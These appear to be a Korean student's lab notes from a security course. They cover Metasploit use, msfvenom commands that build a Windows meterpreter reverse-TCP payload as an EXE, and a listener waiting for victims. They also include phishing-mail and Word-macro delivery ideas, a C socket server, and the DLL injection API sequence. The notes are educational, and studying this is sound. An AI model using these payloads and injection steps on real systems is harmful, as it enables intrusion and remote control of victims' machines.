# DAY 2

## 공격자 공격 방법 종류
  - EXE 파일
    1. 악성코드 생성도구(metasploit): 서버 백신 //서버백식은 악성코드 못잡은 경우 O
    2. DLL Injection
  - URL
  - MACRO
  - 웹 취약점
  - 모바일

## metasploit
### command
```
service postgresql start
service metasploit start
msfconsole
```
실행 안 될 경우
find /usr -name dalvik.rb -print <- 설정 파일 검색
마지막 줄 cert.not_after = cert.not_before + 3600 * 24 * 365 * 20
20 -> 2로 변경 후 저장

### command
```
search (search adobe)
use (exploit/linux/browser/adobe_flashplayer_aslaunch)
use windows/meterpreter/reverse_tcp //특정 공간 선택할 수 있음
back (cancel)
show options
set lhost 10.10.10.10
exploit //공격,      +encoders: 특정 기호로 변경
shellcode
bind (->)
reverse (<-)
```

#### senario
```
공격자가 피해자의 연결을 대기한다.
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lport 7070
set lhost 10.0.2.15
exploit
```

#### 악성코드 생성
커널에서
```
msfvenom -l payloads
(msfvenom -p windows/meterpreter/reverse_tcp lhost=10.100.244.20 lport=7070 -f
c)
(msfvenom -p windows/meterpreter/reverse_tcp lhost=10.100.244.20 lport=7070 -f
apk)
msfvenom -p windows/meterpreter/reverse_tcp lhost=10.100.244.20 lport=7070 -f
exe > mytext.exe
```
#### 공유폴더/파일전송
이더넷 인터페이스 통신으로 전송
```
file system/media/sf_폴더명
```
> mytext.exe 옮기니 알약이 감지함
> 백신 끄고 실행하니 쉘 따짐

#### 해야 할 것
- 행위분석 수집 프로그램 개발
- 전처리 프로그램 개발
- 데이터분석

#### 악성코드 메일 공격 방식
> 메일 자동 전송 1:다 공격 가능
> 수신확인 - 스크립트(html)
> 파이썬 코드로 메일 전송 가능(mime)

#### 워드 매크로(CDR?)
passwordchecker procexp에서 full dump 후 strings로 분석
strings PasswordChecker.dmp > a.txt
비밀번호, 메세지 등 문자열로 저장되어 있음
활용 ex
> c소켓 프로그래밍 <- 서버
> 워드 매크로 <- 클라이언트
> 악성 메일 보내서 클릭 여부 확인 가능


주체: 행위, 메모리, 실행파일
환경: 얘도 알아야



![day2_2](https://user-images.githubusercontent.com/50771111/88466051-756ab380-cf03-11ea-972a-a8c19b88ad2f.jpg)



### 서버
#### test123.c //server.c
```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <sys/socket.h>

#define  BUFF_SIZE   1024

int   main( void)
{
   int   server_socket;
   int   client_socket;
   int   client_addr_size;
   struct sockaddr_in   server_addr;
   struct sockaddr_in   client_addr;
   char   buff_rcv[BUFF_SIZE+5];
  server_socket  = socket( PF_INET, SOCK_STREAM, 0); //소켓 만듦
   memset( &server_addr, 0, sizeof( server_addr));
   server_addr.sin_family     = AF_INET; //인터넷
   server_addr.sin_port       = htons(7070); //포트 7070 -> 서버
   server_addr.sin_addr.s_addr= htonl( INADDR_ANY); //0.0.0.0 누구나 연결할 수 있음
bind( server_socket, (struct sockaddr*)&server_addr, sizeof( server_addr)); //위에서 세팅한 값 적용(bind)
listen(server_socket, 5); //최대 5명까지 붙을 수 있음
client_socket     = accept( server_socket, (struct sockaddr*)&client_addr, &client_addr_size); //accept : 기다리는 중
      read ( client_socket, buff_rcv, BUFF_SIZE);
      printf( "receive: %s\n", buff_rcv);
 close( client_socket);
 close(server_socket);
}
```

#### 매크로
윈도우만 WSAStartup 해줌!! -> 드라이버를 올림<br>
매크로 코드에서 ** connect(s,sa, Len(sa)) //연결, 서버의 accept로 도착<br>
send(s, comName(0), buf, 0) // 서버의 read로 보내줌

그렇다면 소켓이 뭐가 다른가
  문제는 동시에 여러명이 열면 어떻게 되는가
  => fork()로 멀티프로세싱 처리

### DLL 만들기
> 비주얼 스튜디오(파이썬으로 못만듦)
> 뉴 프로젝트 -> 콘솔 응용 프로그램 체크, DLL 체크로 생성
> DLL 생성
> message box(NULL, "Hello", "Test", MB_OK); //"Hello"라는 메세지 박스를 불르라는 의미

DLL은 혼자 프로그램 돌아갈 수 X
#### cmd
> rundll32.exe DLL파일 경로, main // rundll32.exe 라는 보안 프로그램이 있음, 강제적으로 부모 만들어주는 것!(가짜 main 생성)
=> **DLL Injection은 코드(메세지 박스)를 다른 프로그램에 삽입해서 실행될 수 있게 하는 것?!

### DLL Injection
DLL을 쓰는 프로그램 만들고 싶음
> LoadLibrary("testdll.dll"); //정상 프로그램에서 dll 쓸 수 있음
testdll.dll이 11자리이기 때문에 실행시키고 싶은 다른 프로그램에 11자리만큼 자리 만들어놔야함
> virtualAlloc(공간 할당할 프로그램의 pid, 자리수), ex. virtualAlloc(10, 11) //남의 프로그램에 11byte의 공간 할당됨 **=> x** <br>
> writeMemory(x, "내용(ex.aaa)"); //남의 메모리에 aaa 써짐 **=> y**
> GetProcAddress("&L-); //주소얻음 **=> z**
>CreateREmoteThread(z, y);

* 사용 함수
  - VirtualAllocEx
  - WriteProcessMemory
  - GetModuleHandle <- loadlibrary
  - GetProcAddress
  - RemoteThread





**snapshot**

#### cmd
>tasklist //프로그램의 pid 리스트
>tasklist | findstr 11772(pid) 

#### strings 프로그램
**cmd**
> strings injector.exe >a.txt //실행파일에 있는 문자열들이 a.txt에 들어가게 됨
